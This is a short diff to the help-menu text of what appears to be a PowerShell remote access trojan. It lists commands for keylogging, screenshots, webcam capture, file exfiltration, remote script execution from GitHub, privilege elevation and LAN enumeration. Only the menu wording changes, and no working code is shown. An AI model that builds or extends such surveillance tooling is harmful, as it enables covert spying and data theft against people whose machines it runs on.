@@ -61,8 +61,8 @@ $msgsys = "``========================================================
 = Message : Send a message window to the User          =
 = Screenshot  : Sends a screenshot of the desktop      =
 = Keycapture   : Capture Keystrokes and send           =
-= Exfiltrate : Send various files.                     =
-= Upload : Upload a file. eg. upload <pth/to/file>     =
+= Exfiltrate : Send various files. (see ExtraInfo)     =
+= Upload : Upload a file. (see ExtraInfo)              =
 = Systeminfo : Send System info as text file.          =
 = TakePicture : Send a webcam picture.                 =
 = FolderTree : Save folder trees to file and send.     =
@@ -72,7 +72,7 @@ $msgsys = "``========================================================
 = CustomCommand : Execute a github file as a script.   =
 = IsAdmin  : Check if the session is admin             =
 = AttemptElevate : Attempt to restart script as admin  =
-= EnumerateLAN  : Show all devices on the network      =
+= EnumerateLAN  : Show devices on LAN (see ExtraInfo)  =
 = Close  : Close this Session                          =
 ========================================================
 = Examples and Info -                                  =
